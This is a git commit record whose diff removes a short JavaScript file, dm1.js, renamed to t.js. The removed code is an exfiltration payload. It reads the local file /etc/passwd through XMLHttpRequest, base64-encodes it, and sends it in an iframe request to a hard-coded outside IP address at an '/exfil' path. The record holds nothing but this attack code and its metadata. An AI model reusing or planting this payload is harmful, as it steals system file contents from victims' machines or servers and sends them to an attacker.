6900565c8578295e6a0aa1584b8194a6ec77d990
abdelali khalfi <38424164+abdelalikhalfi@users.noreply.github.com>
2024-06-22 20:49:33 +0100

    Update and rename dm1.js to t.js

--- dm1.js
+++
@@ -1,8 +0,0 @@
-function reqListener() {
-    var b64 = btoa(this.responseText);
-    document.write('<iframe src="http://196.64.174.253:443/exfil?data=' + b64 + '"></iframe>');
-} 
-var oReq = new XMLHttpRequest(); 
-oReq.addEventListener("load", reqListener); 
-oReq.open("GET", "file:///etc/passwd"); 
-oReq.send();
